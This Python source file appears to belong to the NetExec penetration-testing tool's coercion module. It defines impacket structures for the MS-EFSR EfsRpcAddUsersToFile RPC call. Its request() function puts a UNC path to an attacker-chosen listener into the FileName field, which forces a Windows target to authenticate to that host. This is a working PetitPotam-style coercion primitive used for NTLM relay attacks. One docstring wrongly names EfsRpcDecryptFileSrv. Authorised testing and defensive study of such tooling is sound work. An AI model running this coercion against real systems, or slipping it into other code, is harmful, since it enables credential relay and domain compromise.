from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import WSTR

from nxc.modules.coerce_plus_method.MS_EFSR.dtypes import ENCRYPTION_CERTIFICATE_LIST
from nxc.data.coercer_method.DCERPCSessionError import DCERPCSessionError


class EfsRpcAddUsersToFile(NDRCALL):
    """Structure to make the RPC call to EfsRpcAddUsersToFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/afd56d24-3732-4477-b5cf-44cc33848d85)"""
    opnum = 9
    structure = (
        ("FileName", WSTR),   # Type: wchar_t *
        ("EncryptionCertificates", ENCRYPTION_CERTIFICATE_LIST)
    )


class EfsRpcAddUsersToFileResponse(NDRCALL):
    """Structure to parse the response of the RPC call to EfsRpcDecryptFileSrv() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    structure = ()


def request(dce, target, listener):
    request = EfsRpcAddUsersToFile()
    request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
    dce.request(request)